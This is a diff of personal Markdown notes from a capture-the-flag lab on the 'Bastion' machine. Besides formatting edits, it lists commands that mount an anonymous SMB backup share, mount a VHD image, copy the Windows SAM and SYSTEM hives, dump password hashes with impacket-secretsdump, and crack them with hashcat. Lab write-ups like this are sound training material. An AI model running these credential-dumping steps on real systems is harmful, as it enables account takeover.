@@ -3,7 +3,7 @@
 	- `sudo mkdir /mnt/Bastion`
 	- `sudo mount -t cifs -o username=anonymous //10.10.10.134/Backups /mnt/Bastion/`
 - Then we can `guestmount`the `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`file:
-	- The guestmount program can be **used to mount virtual machine filesystems and other disk images on the host**
+	- The **guestmount** program can be **used to mount virtual machine filesystems and other disk images on the host**
 	- `sudo guestmount -a /mnt/Bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i /mnt/vhd`
 
 # Dumping the SAM and SYSTEM file
@@ -13,6 +13,7 @@
 	- `cp C:\Windows\System32\config\SAM .`
 - Then just **dump** the hashes using `secretsdump`**:
 	- `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
+	- ==Note :- We might also need the `SECURITY`file==
 		- ![[Pasted image 20250421114659.png]]
 - **Crack the NTLM hashes** using `hashcat`
 	- ![[Pasted image 20250421114827.png]]
